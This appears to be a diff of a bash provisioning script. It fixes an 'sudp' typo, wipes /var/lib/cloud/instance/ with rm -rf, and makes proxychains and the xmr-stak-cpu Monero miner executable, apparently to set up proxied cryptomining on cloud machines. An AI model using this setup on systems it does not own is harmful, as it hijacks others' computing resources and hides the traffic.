@@ -1,7 +1,6 @@
 #!/bin/bash
-sudp apt-get install -y libuv1
+sudo apt-get install -y libuv1
 rm -rf /var/lib/cloud/instance/*
-sudp apt-get install -y libuv1
 sudo chmod +x /m/test01/proxychains-ng/proxychains4
 sudo chmod +x /m/test01/proxychains-ng/libproxychains4.so
 sudo chmod +x /m/test01/xmr/xmr-stak-cpu
